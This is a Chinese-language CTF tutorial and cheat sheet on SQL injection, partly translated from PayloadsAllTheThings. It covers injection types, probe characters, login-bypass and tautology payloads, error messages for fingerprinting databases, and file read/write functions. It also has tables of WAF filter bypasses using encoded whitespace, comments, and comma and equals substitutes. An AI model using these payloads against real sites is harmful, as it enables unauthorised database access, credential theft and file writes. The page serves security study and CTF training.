---
comments: true

---

# SQL 注入

> SQL注入是一种常见的网络攻击方式，通过在用户输入中注入恶意的SQL代码，从而实现未经授权的数据库操作。

本章节部分内容源于[【PayloadsAllTheThings/SQL Injection】](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/) 

在CTF中，对于SQL注入的考察近年来越来越少，且考察的数据库单一（多以MySQL为主），所以笔者再翻译的时候滤掉了针对性的数据库注入模块，如有需求可以阅读上方的引用原文。

国内的SQL注入通常围绕下面考点：

- **数字型注入**：将用户输入的数字直接用于SQL查询，且未进行适当验证或清理时，可构造恶意数字输入。

- **字符型注入**：用户输入的字符型数据（如字符串）被直接拼接到SQL语句中，且未进行转义或参数化处理时，可插入特殊字符（如单引号、双引号等）和SQL语句片段，篡改原SQL语句。

- **盲注**：无法直接从数据库报错信息或查询结果中获取数据，而是通过观察应用程序在执行注入SQL语句后的响应（如页面加载时间、页面内容变化等）来判断注入是否成功，并逐步推断出数据库中的数据。

- **宽字节注入**：某些应用程序在处理字符编码时，会将宽字节字符（如GBK编码中的某些字符）转换为窄字节字符（如UTF-8编码中的字符）。

- **报错注入**：攻击者通过构造特定的SQL注入语句，使数据库产生报错，并从报错信息中获取数据库的版本、表名、列名等信息。

- **二次注入**：首先将恶意SQL代码存储在数据库中，然后通过其他功能（如数据展示、导出等）触发执行。

- **堆叠注入**：通过分号（`;`）等分隔符，将多个SQL语句堆叠在一起执行。

- **约束攻击**：利用 select 与 insert 对长度和空格处理方式不同造成的漏洞。

  > 假设最大长度限制为25 我们输入用户名为 admin[20个空格]1,密码随意。select 检查的时候实际用的是 admin1，这时数据库中是不存在 admin1 的，（假设数据库中已经存在 admin），所以会执行 insert 操作。但由于 select 与 insert 机制不同，insert 会直接截断，插入的是 admin[20个空格]，由于 SQL 处理字符串的机制，实际插入的就变成了 admin，这样库中就插入了两条 admin。
  >
  
- **文件操作**：利用SQL注入进行文件读写操作。

- **UDF提权**：UDF（用户自定义函数）是数据库中的一种扩展机制，允许用户创建自己的函数。通过SQL注入，创建恶意的UDF，然后利用该UDF执行系统命令或进行其他提权操作。

- **WAF Bypass**：对常见的SQL注入关键字或者符号进行过滤，需要通过各类特性绕过限制从而实现注入。

  

## 注入点判断

**基于报错**：在输入字段中输入特殊字符（例如，单引号 `'`）可能会触发 SQL 报错。

如果应用程序显示详细的报错消息，则可以指示潜在的 SQL 注入点。

* 简单字符：`'`, `"`, `;`, `)` 和 `*`
* 编码后的简单字符：`%27`, `%22`, `%23`, `%3B`, `%29` 和 `%2A`
* 多重编码：`%%2727`, `%25%27`
* Unicode 字符：`U+02BA`, `U+02B9`
    * MODIFIER LETTER DOUBLE PRIME (`U+02BA` 编码为 `%CA%BA`) 被转换为 `U+0022` QUOTATION MARK (`)
    * MODIFIER LETTER PRIME (`U+02B9` 编码为 `%CA%B9`) 被转换为 `U+0027` APOSTROPHE (`')

**基于逻辑**：通过输入永真条件（总是成立），可以测试漏洞。例如，将 `admin' OR '1'='1` 输入到用户名字段中，如果系统有漏洞，则可能以管理员身份登录。

* 合并字符
  ```sql
  `+HERP
  '||'DERP
  '+'herp
  ' 'DERP
  '%20'HERP
  '%2B'HERP
  ```
* 逻辑测试
  ```sql
  ?id=1 or 1=1 -- true
  ?id=1' or 1=1 -- true
  ?id=1" or 1=1 -- true
  ?id=1 and 1=2 -- false
  ```

**基于时间**：输入引发故意延迟的 SQL 命令（例如，使用 MySQL 中的 `SLEEP` 或 `BENCHMARK` 函数）可以帮助识别潜在的注入点。如果应用程序在此类输入后响应时间异常长，则可能存在漏洞。



## 数据库判断

通过触发报错并检查数据库返回的特定消息，用于识别。

| 数据库               | 示例报错消息                                                 | 示例Payload |
| :------------------- | :----------------------------------------------------------- | :---------- |
| MySQL                | `You have an error in your SQL syntax; ... near '' at line 1` | `'`         |
| PostgreSQL           | `ERROR: unterminated quoted string at or near "'"`           | `'`         |
| PostgreSQL           | `ERROR: syntax error at or near "1"`                         | `1'`        |
| Microsoft SQL Server | `Unclosed quotation mark after the character string ''.`     | `'`         |
| Microsoft SQL Server | `Incorrect syntax near ''.`                                  | `'`         |
| Microsoft SQL Server | `The conversion of the varchar value to data type int resulted in an out-of-range value.` | `1'`        |
| Oracle               | `ORA-00933: SQL command not properly ended`                  | `'`         |
| Oracle               | `ORA-01756: quoted string not properly terminated`           | `'`         |
| Oracle               | `ORA-00923: FROM keyword not found where expected`           | `1'`        |

### 常用参数：

- `user()`：当前数据库用户
- `database()`：当前数据库名
- `version()`：当前使用的数据库版本
- `@@datadir`：数据库存储数据路径
- `concat()`：联合数据，用于联合两条数据结果。如 `concat(username,0x3a,password)`
- `group_concat()`：和 `concat()` 类似，如 `group_concat(DISTINCT+user,0x3a,password)`，用于把多条数据一次注入出来
- `concat_ws()`：用法类似
- `hex()` 和 `unhex()`：用于 hex 编码解码
- `ASCII()`：返回字符的 ASCII 码值
- `CHAR()`：把整数转换为对应的字符
- `load_file()`：以文本方式读取文件，在 Windows 中，路径设置为 `\\`
- `select xxoo into outfile '路径'`：权限较高时可直接写文件


## 常见绕过

### 空格绕过

**URL编码：**

- `%09` .Eg：`?id=1%09and%091=1%09--`
- `%0A` .Eg：`?id=1%0Aand%0A1=1%0A--`
- `%0B` .Eg：`?id=1%0Band%0B1=1%0B--`
- `%0C` .Eg：`?id=1%0Cand%0C1=1%0C--`
- `%0D` .Eg：`?id=1%0Dand%0D1=1%0D--`
- `%A0` .Eg：`?id=1%A0and%A01=1%A0--`
- `%A0` .Eg：`?id=1%A0and%A01=1%A0--`

**特定Hex：**

| 数据库     | 特殊字符Hex                                                  |
| :--------- | :----------------------------------------------------------- |
| SQLite3    | 0A, 0D, 0C, 09, 20                                           |
| MySQL 5    | 09, 0A, 0B, 0C, 0D, A0, 20                                   |
| MySQL 3    | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
| PostgreSQL | 0A, 0D, 0C, 09, 20                                           |
| Oracle 11g | 00, 0A, 0D, 0C, 09, 20                                       |
| MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |

**注释和括号：**

**注释-1**：`?id=1/*comment*/AND/**/1=1/**/--`       

**注释-2**：`?id=1/*!12345UNION*//*!12345SELECT*/1--`

**括号-1**：`?id=(1)and(1)=(1)--`                    

### 逗号绕过

使用`OFFSET`、`FROM`和`JOIN`进行绕过。

| BAN                  | 绕过                                                         |
| :------------------ | :----------------------------------------------------------- |
| `LIMIT 0,1`         | `LIMIT 1 OFFSET 0`                                           |
| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)`                                 |
| `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |

### 等号绕过

使用LIKE/NOT IN/IN/BETWEEN进行绕过

| 绕过      | SQL示例                                    |
| :-------- | :----------------------------------------- |
| `LIKE`    | `SUBSTRING(VERSION(),1,1)LIKE(5)`          |
| `NOT IN`  | `SUBSTRING(VERSION(),1,1)NOT IN(4,3)`      |
| `IN`      | `SUBSTRING(VERSION(),1,1)IN(4,3)`          |
| `BETWEEN` | `SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4` |

### 大小写绕过

使用大写/小写进行绕过。

大写：`AND`
小写：`and`
混合：`aNd`

### 符号和字母相互代替

| BAN | 绕过方法                      |
| :-------- | :-------------------------- |
| `AND`     | `&&`                        |
| `OR`      | `\|\|`                      |
| `=`       | `LIKE`, `REGEXP`, `BETWEEN` |
| `>`       | `NOT BETWEEN 0 AND X`       |
| `WHERE`   | `HAVING`                    |

